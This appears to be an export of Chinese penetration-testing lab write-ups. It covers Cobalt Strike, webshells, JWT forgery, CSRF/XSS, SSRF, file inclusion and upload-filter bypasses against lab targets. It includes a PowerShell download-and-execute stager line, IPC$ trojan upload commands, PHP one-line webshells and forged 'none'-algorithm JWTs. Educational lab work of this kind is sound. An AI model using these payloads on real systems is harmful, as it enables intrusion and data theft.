[{"title":"渗透测试-cs工具","url":"/2025/08/27/渗透测试-cs工具/","content":"\n### 1、Cobalt Strike\n\n你可以把 Cobalt Strike 理解为一个 **“网络攻击的指挥控制中心”**（C2, Command and Control）。攻击者（红队）先在被攻击目标（肉鸡）上植入一个小小的“木马”（叫做 **Beacon**），然后通过 Cobalt Strike 的服务端（团队服务器）向这些 Beacon 发送命令，Beacon 执行命令后再将结果回传。攻击者通过一个图形化的客户端来操作这一切。\n\n### 2、cs利用\n\n攻击机：kali，win11\n\n靶机：win7\n\n在kali启动cs服务端\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041626529.png)\n\nwin11客户端连接服务端\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041631878.png)\n\n添加监听主机\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041634648.png)\n\n生成木马\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041632785.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041635194.png)\n\n将muma保存到桌面\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041635022.png)\n\n利用ipc管道将文件上传到靶机\n\n```\n//连接靶机\nnet use \\\\靶机ip\\ipc$ <靶机密码> /user:<靶机用户名>\n\n//上传到靶机c盘\ncopy <木马地址路径> \\\\靶机ip\\C$\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041654885.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041654320.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041654971.png)\n\n在靶机上双击运行木马，再回到客户端查看\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041655814.png)\n\n成功上线！！！\n\n执行命令查看ipconfig\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041659189.png)\n\n尝试其他上线方式\n\npowershell\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041702903.png)\n\n```\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.18.172:9677/a'))\"\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041720392.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041721754.png)\n\n成功上线！！！！\n\n### 搭建socks代理\n\n环境\n\n攻击机：win11、kali\n\n靶机：win7、win7克隆\n\n| win11   | nat        | 192.168.18.175                 |\n| ------- | ---------- | ------------------------------ |\n| kali    | nat        | 192.168.18.172                 |\n| win7pc1 | nat\\vmnet1 | 192.168.18.143、192.168.159.10 |\n| win7pc2 | vmnet1     | 192.168.159.20                 |\n\n此时win11无法ping通pc2，kali也无法ping通pc2\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041934585.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041946973.png)\n\n上线木马之后，开启sock代理\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041938327.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041938761.png)\n\n查看代理设置\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041947244.png)\n\n这里端口就是服务端socks监听端口，去服务端查看端口是否开启\n\n```\nnetstat -tunlp | grep <你开启的socks端口>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509041948808.png)\n\n编辑配置文件，挂上团队服务socks\n\n```\n/etc/proxchains.conf\n```\n\n再nmap进行扫描\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509042023942.png)\n\n成功扫描到pc2\n"},{"title":"java序列化和反序列化","url":"/2025/08/26/java序列化和反序列化/","content":"\n\n\n### 一、核心概念\n\n#### 1. 序列化 (Serialization)\n\n- **定义**： 将 **Java 对象**的状态信息转换为一种**字节序列**的过程。\n- **目的**： 这个字节序列可以被轻松地**存储到文件**（.ser 文件）、**写入数据库**，或者通过**网络传输**到另一个系统。\n- **比喻**： 就像把一辆汽车**拆解**成一大堆标准化的零件，然后整齐地打包进箱子，以便于运输或存放在仓库里。这个过程只打包了汽车的**属性**（颜色、型号、零件）和**设计图信息**（类结构），但并不打包制造汽车的“工厂”本身（即类的代码逻辑）。\n\n#### 2. 反序列化 (Deserialization)\n\n- **定义**： 是序列化的逆过程。将字节序列**重建**为内存中的 Java 对象。\n- **目的**： 从文件、数据库或网络流中恢复出与序列化时状态完全一致的对象。\n- **比喻**： 就像在目的地收到那箱零件后，根据里面的**设计图信息**，将零件重新**组装**回一辆一模一样的汽车。\n\n### 实例化类调用函数\n\n编写代码\n\nTest类\n\n```java\npublic class Test {\n    public static void main(String[] args) {\n        Cxk kun = new Cxk();\n        kun.talk();\n    }\n}\n```\n\nCxk类\n\n```Java\npublic class Cxk extends Person {\n    public String name;\n}\n```\n\nPerson类\n\n```java\npublic class Person {\n    public int age;\n    public String tall;\n    public void talk(){\n        System.out.println(\"i am person！！！\");\n    }\n}\n```\n\n执行\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509031653684.png)\n\n### 重写talk函数，再次调用\n\n在Cxk中重写方法\n\n```\npublic class Cxk extends Person {\n    public String name;\n    public void talk(){\n        System.out.println(\"i am kun！！！\");\n    }\n}\n```\n\n执行\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509031646529.png)\n\n### 编写序列化反序列化函数，对象序列化保存到文件里，再反序列化输出\n\ntest\n\n```java\nimport java.io.*;\npublic class Test {\n    public static void main(String[] args) throws IOException,\n            ClassNotFoundException {\n        Person p = new Person();\n        p.age = 22;\n        p.name = \"thy\";\n        serialize(p, \"thy.bin\");\n        System.out.println(\"反序列化结果：\" + deserialize(\"thy.bin\"));\n    }\n\n    public static void serialize(Object obj, String filePath) throws IOException {\n        try (FileOutputStream fileOut = new FileOutputStream(filePath);\n             ObjectOutputStream objectOut = new ObjectOutputStream(fileOut)) {\n            objectOut.writeObject(obj);\n        }\n    }\n\n    public static Object deserialize(String filePath) throws IOException,\n            ClassNotFoundException {\n        try (FileInputStream fileIn = new FileInputStream(filePath);\n             ObjectInputStream objectIn = new ObjectInputStream(fileIn)) {\n            return objectIn.readObject();\n        }\n    }\n}\n```\n\nperson\n\n```java\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.Serializable;\npublic class Person implements Serializable {\n    public int age;\n    public String name;\n\n    private void readObject(ObjectInputStream in) throws IOException,\n            ClassNotFoundException {\n        System.out.println(\"已反序列化\");\n// 默认的反序列化操作\n        in.defaultReadObject();\n    }\n}\n```\n\n执行\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509031814014.png)\n\n### "},{"title":"渗透测试-前端逆向验签","url":"/2025/08/24/渗透测试-前端逆向验签/","content":"\n\n\n### 1、yakit验签与数据加密\n\n#### ①验签\n\n随便输入用户名和密码登录\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011640566.png)\n\n抓包，发现有个签名部分\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011641375.png)\n\n分析前端加密代码\n\n```js\n<script>\n    \n    var iv = CryptoJS.lib.WordArray.random(128/8);\n    \n\n    function generateKey() {\n        return  CryptoJS.enc.Utf8.parse(\"1234123412341234\")  // 十六位十六进制数作为密钥\n    }\n\n    const key = generateKey()\n\n    // 解密方法\n    function Decrypt(word) {\n        return  CryptoJS.AES.decrypt(word, key, {iv: iv}).toString(); \n    }\n\n    // 加密方法\n    function Encrypt(word) {\n        console.info(word);\n        return  CryptoJS.AES.encrypt(word, key, {iv: iv}).toString(); \n    }\n\n    function getData() {\n        return {\n            \"username\": document.getElementById(\"username\").value,\n            \"password\": document.getElementById(\"password\").value,\n        }\n    }\n\n    function outputObj(jsonData) {\n        const word = JSON.stringify(jsonData);\n        return {\n            \"data\": Encrypt(word),\n            \"key\": key.toString(),\n            iv: iv.toString(),\n        }\n    }\n\n    function submitJSON(event) {\n        event.preventDefault();\n\n        const url = \"/crypto/js/lib/aes/cbc/handler\";\n        let jsonData = getData();\n        let submitResult = JSON.stringify(outputObj(jsonData), null, 2)\n        console.log(\"key\", key)\n        fetch(url, {\n            method: \"POST\",\n            headers: {\n                \"Content-Type\": \"application/json\"\n            },\n            body: submitResult,\n        })\n            .then(response => response.text())\n            .then(data => {\n                console.log(\"Success:\", data);\n                document.body.innerHTML = data;\n            })\n            .catch((error) => {\n                console.error(\"Error:\", error);\n            });\n    }\n\n    document.getElementById(\"json-form\").addEventListener(\"change\", () => {\n        let jsonData = {\n            \"username\": document.getElementById(\"username\").value,\n            \"password\": document.getElementById(\"password\").value,\n        };\n        document.getElementById(\"encrypt\").innerHTML = JSON.stringify(outputObj(jsonData), null, 2)\n        document.getElementById(\"input\").innerHTML = JSON.stringify(jsonData, null, 2)\n    })\n    document.getElementById(\"json-form\").addEventListener(\"submit\", submitJSON)\n</script>\n```\n\n对用户名和密码进行了加密之后生成的签名\n\n写热加载代码\n\n```yacas\n//密钥是1234123412341234\nfunc sign(user,pass){\n    return codec.EncodeToHex(codec.HmacSha256(\"1234123412341234\",\nf`username=${user}&password=${pass}`)~)\n}\n//提取用户名和密码\nsignRequest = result => {\n    pairs := result.SplitN(\"|\",2)\n    dump(pairs)\n    return sign(pairs[0],pairs[1])\n}\n```\n\n启用后将密码字典设置为变量\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011649377.png)\n\n构造请求\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011649046.png)\n\n再进行爆破\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011650044.png)\n\n成功爆破\n\n#### ②数据加密\n\n前端加密代码\n\n```\n<script>\n    \n    var iv = CryptoJS.lib.WordArray.random(128/8);\n    \n\n    function generateKey() {\n        return  CryptoJS.enc.Utf8.parse(\"1234123412341234\")  // 十六位十六进制数作为密钥\n    }\n\n    const key = generateKey()\n\n    // 解密方法\n    function Decrypt(word) {\n        return  CryptoJS.AES.decrypt(word, key, {iv: iv}).toString(); \n    }\n\n    // 加密方法\n    function Encrypt(word) {\n        console.info(word);\n        return  CryptoJS.AES.encrypt(word, key, {iv: iv}).toString(); \n    }\n\n    function getData() {\n        return {\n            \"username\": document.getElementById(\"username\").value,\n            \"password\": document.getElementById(\"password\").value,\n        }\n    }\n\n    function outputObj(jsonData) {\n        const word = JSON.stringify(jsonData);\n        return {\n            \"data\": Encrypt(word),\n            \"key\": key.toString(),\n            iv: iv.toString(),\n        }\n    }\n\n    function submitJSON(event) {\n        event.preventDefault();\n\n        const url = \"/crypto/js/lib/aes/cbc/handler\";\n        let jsonData = getData();\n        let submitResult = JSON.stringify(outputObj(jsonData), null, 2)\n        console.log(\"key\", key)\n        fetch(url, {\n            method: \"POST\",\n            headers: {\n                \"Content-Type\": \"application/json\"\n            },\n            body: submitResult,\n        })\n            .then(response => response.text())\n            .then(data => {\n                console.log(\"Success:\", data);\n                document.body.innerHTML = data;\n            })\n            .catch((error) => {\n                console.error(\"Error:\", error);\n            });\n    }\n\n    document.getElementById(\"json-form\").addEventListener(\"change\", () => {\n        let jsonData = {\n            \"username\": document.getElementById(\"username\").value,\n            \"password\": document.getElementById(\"password\").value,\n        };\n        document.getElementById(\"encrypt\").innerHTML = JSON.stringify(outputObj(jsonData), null, 2)\n        document.getElementById(\"input\").innerHTML = JSON.stringify(jsonData, null, 2)\n    })\n    document.getElementById(\"json-form\").addEventListener(\"submit\", submitJSON)\n</script>\n```\n\n热加载代码\n\n```\naescbc = result => {\nresult = codec.AESCBCEncryptWithPKCS7Padding(\ncodec.DecodeHex(`31323334313233343132333431323334`)~,\nresult,\ncodec.DecodeHex(`255a6d83ab4a04d6e8308b9feb9e3a1b`)~,\n)~\nreturn string(result)\n}\n```\n\n构造请求\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011704011.png)\n\n爆破，但是爆破失败\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011704127.png)\n\n### 2、token防爆破\n\n随意输入账户密码进行抓包\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011535966.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011536639.png)\n\n数据包发送到fuzz模块，并点击发送请求，找到响应返回的token值\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011537296.png)\n\n点击左侧配置，添加一个数据提取器，提取xpath数据，输入规则//input[@name='token']/@value\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011539326.png)\n\n再设置一个变量，变量名为pass，值就是密码字典\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011541598.png)\n\n再次将数据包发送到fuzz，后点击左侧序列，添加序列\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011542857.png)\n\n在第二个序列中引用变量\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011544385.png)\n\n最后开始执行爆破，成功爆破\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202509011545287.png)\n\n### "},{"title":"渗透测试-命令执行&jwt伪造以及越权","url":"/2025/08/23/渗透测试-命令执行&jwt伪造以及越权/","content":"\n\n\n### 1、php命令执行函数和代码执行函数\n\n#### ①命令执行函数\n\n- system()\n\n  执行系统命令，自带回显\n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  system($test);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281548796.png)\n\n- exec()\n\n  执行系统命令，无回显，需要输出，且只输出最后一行\n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  echo exec($test);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281552697.png)\n\n- shell_exec()\n\n  执行系统命令，无回显，需要输出\n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  echo shell_exec($test);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281554718.png)\n\n- passthru()\n\n  执行系统命令，自带回显\n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  passthru($test);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281556034.png)\n\n- popen()\n\n  执行系统命令，无回显，需要使用文件读取输出\n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  echo fread(popen($test,'r'),10);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281601537.png)\n\n- 反引号\n\n  `反引号内字符串会被当做系统命令执行，无回显，需要输出\n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  echo `$test`;\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281605644.png)\n\n#### ②代码执行函数\n\n- eval\n\n  将内容当作代码执行，语句需要加 ; \n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  eval($test);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281609692.png)\n\n- assert\n\n  将内容当作代码执行，不需要加 ；，且只能执行单条语句，如echo '123' 无法执行，在高版本已移除这个函数\n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  assert($test);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281614746.png)\n\n- preg_replace\n\n  这个函数具有一个修饰符e，代表eval，使用这个修饰符时会将第二个参数，也就是待替换的字符串被当作代码执行\n\n  ```php\n  <?php\n  $test=$_GET['test'];\n  $data=\"Hello, {username}!\";\n  $data=preg_replace(\"/\\{username\\}/e\",$test,$data);\n  echo $data;\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281629133.png)\n\n- call_user_func\n\n  可以调用函数执行\n\n  ```php\n  <?php\n  $test1=$_GET['test1'];\n  $test2=$_GET['test2'];\n  call_user_func($test1,$test2);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281633476.png)\n\n- array_map\n\n  同call_user_func类似，也能调用函数执行，但第二个参数必须是数组的形式\n\n  ```php\n  <?php\n  $test1=$_GET['test1'];\n  $test2=array($_GET['test2']);\n  array_map($test1,$test2);\n  ?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281640698.png)\n\n### 2、代码执行函数编写一句话木马\n\n- assert\n\n  ```php\n  <?php @assert($_GET['test']);?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281645178.png)\n\n- preg_replace\n\n  ```php\n  <?php @preg_replace(\"/a/e\",$_GET['real'],$_GET['fake']);?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281649091.png)\n\n- call_user_func\n\n  ```php\n  <?php @call_user_func($_GET['func'],$_GET['sys']);?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281655317.png)\n\n- array_map\n\n  ```php\n  <?php @array_map($_GET['func'],array($_GET['sys']))?>\n  ```\n\n  ![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281657016.png)\n\n### 3、JWT伪造\n\njwt为json格式的web令牌，分为三部分组成，头部、载荷、签名，可以进行伪造，无加密或者爆破加密密钥\n\n#### ①pass-4\n\n访问靶场，点击删除，进行抓包\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281659032.png)\n\n提示只有admin有权限重置，并且进行了jwt校验\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281700315.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281701930.png)\n\n将jwt复制下来，发送到jwt.io平台查看jwt的内容，head记录了签名使用的算法，payload记录了用户的身份信息，签名则用于验证信息的合法性\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281713021.png)\n\n修改head和payload内容，进行base64编码，当head内容为none时表示未使用算法，所以签名部分为空\n\n```\neyJhbGciOiJub25lIn0.eyJpYXQiOjE3NTcyMzU1NjAsImFkbWluIjoidHVyZSIsInVzZXIiOiJUb20ifQ.\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281717287.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281716764.png)\n\n然后重新构造数据包，将jwt更换，然后发送\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281720247.png)\n\n成功重置\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281720248.png)\n\n#### ②pass-7\n\n要求具有有效jwt才能进行支付，我们伪造一个用户的jwt，让他帮忙支付\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281721319.png)\n\n虽然目前没有jwt，但是可以查看日志，日志里有可能将过期的jwt记录下来\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281724486.png)\n\n拿到了一串jwt\n\n```\neyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q\n```\n\n然后去进行伪造，还是同样的方法，将算法设置为none，还需要进行设置时间戳，这里exp代表令牌的结束时间，想要让这个令牌再次生效的话就要更改\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281725118.png)\n\n找到一个时间戳生成平台，获取一个较靠后的时间戳\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281727637.png)\n\n伪造jwt\n\n```\neyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTc1NjM4MDQ0NSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281729980.png)\n\n构造请求包发送，这个请求包jwt在Authorization字段\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281731482.png)\n\n### 4、通关pikachu靶场的越权\n\n#### ①水平越权\n\n查看个人信息，发现是通过get传参一个用户名查看的\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281939805.png)\n\n修改参数为kobe\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281940109.png)\n\n成功查看到其他人信息\n\n#### ②垂直越权\n\nadmin账户有添加功能，和删除功能，并且有专属的url地址\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281941438.png)\n\n登录普通用户，去访问添加用户的地址\n\n```\nhttp://192.168.18.175/pikachu-master/vul/overpermission/op2/op2_admin_edit.php\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281943505.png)\n\n可以进到添加页面，随意添加一个用户查看\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508281943068.png)\n\n成功添加"},{"title":"渗透测试-csrf&ssrf&文件包含","url":"/2025/08/22/渗透测试-csrf&ssrf&文件包含/","content":"\n\n\n### 1、csrf漏洞配合存储型XSS组合拳\n\n**核心思想**：攻击者欺骗用户的浏览器，让其以一个已认证用户（登录用户）的身份，向目标网站发送一个非预期的请求。\n\n#### ①使用admin账号，密码password进入到csrf靶场，发现具有更改密码功能\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271605415.png)\n\n#### ②进行修改密码，发现是get传参，并且没有验证码校验，直接通过链接发起请求\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271606226.png)\n\n#### ③将链接保存复制下来，利用<img>标签去自动加载链接达到对修改目标密码的操作，去留言板页面插入xss代码，需配合存储型xss\n\n```javascript\npayload：<img src=\"http://192.168.18.175/DVWA-master/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#\" style=\"display:none;\">\n```\n\n#### ④前端对长度进行限制，但是可以修改，然后保存\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271611508.png)\n\n#### ⑤换一个浏览器，使用另一个账号登录dvwa，账号gordonb，密码abc123，进入后去访问刚才注入xss代码的页面\n\n![image-20250827161701576](C:\\Users\\thy\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250827161701576.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271632104.png)\n\n#### ⑥此时用户已经遭受到攻击，去到admin所在浏览器，退出登录，使用gordonb登录，密码是xss请求的123456\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271634669.png)\n\n成功登录！！！\n\n### 2、ssrf漏洞\n\n**核心思想**：攻击者利用一个Web应用程序的功能，**欺骗后端服务器向任意一个内网或外网地址发起HTTP请求**。攻击的目标不是应用程序本身，而是应用程序所能访问到的**内部系统**或**外部第三方系统**。\n\n#### ①进入ssrf靶场\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271637307.png)\n\nurl里面存在请求加载某个链接中的文件\n\n#### ②通过wappalyzer得知是windows操作系统\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271639083.png)\n\n#### ③读取敏感文件\n\n```\nwindows域名解析地址\"C:\\Windows\\System32\\drivers\\etc\\hosts\"\npayload：file://C:\\\\Windows\\System32\\drivers\\etc\\hosts\n利用file伪协议来读取目标主机本地文件\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271645820.png)\n\n### 3、文件包含漏洞配合图片木马\n\nWeb应用程序在引入（包含）外部文件时，未对用户传入的文件名参数进行充分的验证和过滤，导致攻击者可以操控该参数，让应用程序包含并执行非预期的恶意文件。\n\n函数：include()  require()  include_once()  require_once()  \n\n#### ①进入includ靶场，使用本地文件包含靶场\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271650814.png)\n\n#### ②在自己宿主机制作图片马\n\n创建一个正常图片png和一个一句话php文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271657649.png)\n\n命令行执行\n\n```bash\ncopy 1.png/b+1.php/a 123.png \n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271700621.png)\n\n图片马制作完成\n\n#### ③进行本地包含图片马，假设已经上传上图片马，并且知道路径\n\n```\npayload：123.png\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271806623.png)\n\n成功解析\n\n### 4、文件包含和文件读取的区别\n\n#### ①文件读取\n\n编写代码test.php\n\n```php\n<?php\n\n$filename = $_GET['filename'];\n\necho fgets(fopen($filename,'r'));\n \n?>\n```\n\n在根目录下保存两个文件123.txt和123.php\n\n```php\n//123.txt\nthis is file\n\n//123.php\n<?php phpinfo();?>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271848127.png)\n\n访问test.php,输入123.txt和123.php\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271850042.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271851113.png)\n\n文件读取是将文件以文本的方式进行打开，并不会将其解析为脚本语言\n\n#### ②文件包含\n\n更改代码\n\n```php\n<?php\n\n$filename = $_GET['filename'];\n\ninclude($filename);\n \n?>\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271853799.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508271854254.png)\n\n文件包含会将脚本文件进行解析\n\n### "},{"title":"渗透测试-文件上传","url":"/2025/08/21/渗透测试-文件上传/","content":"\n\n\n### 1、文件上传靶场\n\n文件上传漏洞的根本原理在于：应用程序未能对用户上传的文件进行充分、有效的安全验证，导致攻击者能够上传并执行恶意文件，从而完全接管服务器。\n\n简单来说，就是一个本应只上传图片、文档等安全文件的功能，因为缺乏检查，被攻击者利用来上传了“木马后门”程序（如`.php`, `.jsp`, `.aspx`文件）\n\n#### ①pass-1\n\n源码\n\n```javascript\nfunction checkFile() {\n    var file = document.getElementsByName('upload_file')[0].value;\n    if (file == null || file == \"\") {\n        alert(\"请选择要上传的文件!\");\n        return false;\n    }\n    //定义允许上传的文件类型\n    var allow_ext = \".jpg|.png|.gif\";\n    //提取上传文件的类型\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //判断上传文件类型是否允许上传\n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n        alert(errMsg);\n        return false;\n    }\n}\n```\n\n这是前端js代码，只允许上传jpg、png、gif文件，既然是前端，直接F12操作\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261601716.png)\n\n删除return checkfile，然后上传文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261602475.png)\n\n成功上传！！！点击图片去访问\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261604045.png)\n\n#### ②pass-2\n\n源码\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '文件类型不正确，请重新上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';\n    }\n}\n```\n\n对上传文件的MIME类型进行了限制，只允许image/jpeg，image/png、image/gif，使用yakit抓包进行上传\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261613532.png)\n\n修改Content-Type的内容为image/jpeg然后发送包\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261619261.png)\n\n访问图片\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261621685.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261604045.png)\n\n成功上传！！！\n\n#### ③pass-3\n\n源码\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n\n```\n\n设置了黑名单，禁止上传asp、aspx、php、isp文件，并且限制大小写，通过上传非常规后缀名的文件，如php3、php4、phtml，这些文件会被作为php解析，但是需要修改apache配置文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261634679.png)\n\n随后修改要上传的文件后缀名为php3\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261636338.png)\n\n上传成功后，访问该文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508261638800.png)\n\n#### ④pass-4\n\n源码\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = 